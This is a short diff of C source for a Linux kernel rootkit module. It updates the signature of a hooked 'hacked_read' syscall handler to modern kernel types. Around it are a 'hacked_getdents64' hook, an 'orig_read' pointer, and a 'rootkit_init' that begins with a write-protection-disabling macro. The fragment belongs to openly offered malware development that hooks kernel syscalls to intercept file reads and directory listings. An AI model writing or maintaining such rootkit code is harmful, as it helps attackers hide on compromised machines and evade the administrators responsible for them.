@@ -183,14 +183,14 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 	return result;
 }
 
-typedef asmlinkage int (*read_ptr)(unsigned int fd, char *buf,
-                                   unsigned int count);
+typedef asmlinkage long (*read_ptr)(unsigned int fd, char __user *buf,
+                                    size_t count);
 read_ptr orig_read;
 
-asmlinkage int hacked_read(unsigned int fd, char *buf,
-                           unsigned int count)
+asmlinkage long hacked_read(unsigned int fd, char __user *buf,
+                           size_t count)
 {
-	int result;
+	long result;
 	char *kbuf;
 
 	// run real read 
@@ -216,6 +216,7 @@ asmlinkage int hacked_read(unsigned int fd, char *buf,
 	// return number of bytes read
 	return result;
 }
+
 int rootkit_init(void) {
 	GPF_DISABLE;
 
